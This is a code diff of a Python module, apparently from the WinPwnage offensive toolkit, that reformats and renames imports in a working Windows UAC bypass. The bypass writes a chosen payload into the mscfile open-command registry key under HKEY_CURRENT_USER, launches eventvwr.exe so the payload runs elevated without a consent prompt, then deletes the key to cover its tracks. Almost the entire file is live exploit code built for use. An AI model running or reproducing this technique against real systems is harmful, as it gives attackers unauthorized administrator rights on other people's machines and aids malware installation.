@@ -1,25 +1,27 @@
 import os
 import time
 import _winreg
-from core.prints import *
-from core.utils import *
+from winpwnage.core.prints import *
+from winpwnage.core.utils import *
 
 eventviewer_info = {
-        "Description": "Bypass UAC using eventviewer and registry key manipulation",
-		"Id" : "08",
-		"Type" : "UAC bypass",
-		"Fixed In" : "15031",
-		"Works From" : "7600",
-		"Admin" : False,
-		"Function Name" : "eventvwr",
-		"Function Payload" : True,
-    }
+	"Description": "Bypass UAC using eventviewer and registry key manipulation",
+	"Id": "08",
+	"Type": "UAC bypass",
+	"Fixed In": "15031",
+	"Works From": "7600",
+	"Admin": False,
+	"Function Name": "eventvwr",
+	"Function Payload": True,
+}
+
 
 def eventvwr(payload):
-	if (payloads().exe(payload) == True):
+	if payloads().exe(payload):
 		try:
-			key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER,os.path.join("Software\Classes\mscfile\shell\open\command"))				
-			_winreg.SetValueEx(key,None,0,_winreg.REG_SZ,payload)
+			key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER,
+									os.path.join("Software\\Classes\\mscfile\\shell\\open\\command"))
+			_winreg.SetValueEx(key, None, 0, _winreg.REG_SZ, payload)
 			_winreg.CloseKey(key)
 		except Exception as error:
 			print_error("Unable to create registry keys, exception was raised: {}".format(error))
@@ -32,15 +34,15 @@ def eventvwr(payload):
 		print_info("Disabling file system redirection")
 		with disable_fsr():
 			print_success("Successfully disabled file system redirection")
-			if (process().create("cmd.exe /c start eventvwr.exe",1) == True):
+			if process().create("cmd.exe /c start eventvwr.exe", 1):
 				print_success("Successfully spawned process ({})".format(os.path.join(payload)))
 			else:
-				print_error("Unable to spawn process ({})".format(os.path.join(payload)))		
+				print_error("Unable to spawn process ({})".format(os.path.join(payload)))
 
 		time.sleep(5)
 
 		try:
-			_winreg.DeleteKey(_winreg.HKEY_CURRENT_USER,os.path.join("Software\Classes\mscfile\shell\open\command"))
+			_winreg.DeleteKey(_winreg.HKEY_CURRENT_USER,os.path.join("Software\\Classes\\mscfile\\shell\\open\\command"))
 		except Exception as error:
 			print_error("Unable to cleanup")
 			return False
@@ -48,4 +50,4 @@ def eventvwr(payload):
 			print_success("Successfully cleaned up, enjoy!")
 	else:
 		print_error("Cannot proceed, invalid payload")
-		return False			
+		return False
